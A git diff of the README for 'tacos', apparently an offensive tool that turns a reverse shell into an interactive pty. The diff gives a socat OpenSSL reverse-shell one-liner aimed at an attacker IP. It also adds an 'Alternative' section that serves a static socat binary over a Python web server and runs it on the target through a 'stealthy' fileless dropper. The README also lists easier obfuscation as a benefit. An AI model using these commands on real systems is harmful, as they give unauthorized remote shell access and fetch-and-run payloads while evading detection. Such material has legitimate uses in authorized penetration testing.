@@ -5,10 +5,11 @@ Spawn a pty in your reverse shell to automaticcaly make it interactive.
 
 Equivalent of:
 ```shell
-socat exec:'bash -il',pty,stderr,setsid,sigint,sane OPENSSL:10.0.2.15:443,verify=0
+socat exec:'bash -il',pty,stderr,setsid,sigint,sane OPENSSL:[ATTACKER_IP]:443,verify=0
 ```
 **Why ?**
 * too lazy to copy/paste/learn socat command
+* target doesn't have `socat` and you don't want to do [this](#alternative)
 * provide more advanced configuration to the tty (alias, etc)
 * easier to obfuscate
 * cross-platform (to do) 
@@ -24,4 +25,18 @@ socat exec:'bash -il',pty,stderr,setsid,sigint,sane OPENSSL:10.0.2.15:443,verify
 # On target (transfer tacos as you wish)
 ./tacos [ATTACKER_IP]
 # 💥
+```
+
+## Alternative
+
+Alternatively, you can host a [static](https://github.com/minos-org/minos-static/blob/master/static-get) version of `socat` binary and download + execute it using the stealthy  [`filess-xec`](https://github.com/ariary/fileless-xec) dropper:
+```shell
+# On attacker machine
+# get socat static & expose it
+get-static socat
+python3 -m http.server 8080
+
+# On target machine
+# Use already downloaded fileless-xec to download socat and stealthy launch it with argument
+fileless-xec [ATTACKER_URL]/socat -- exec:'bash -il',pty,stderr,setsid,sigint,sane OPENSSL:[ATTACKER_IP]:443,verify=0
 ```
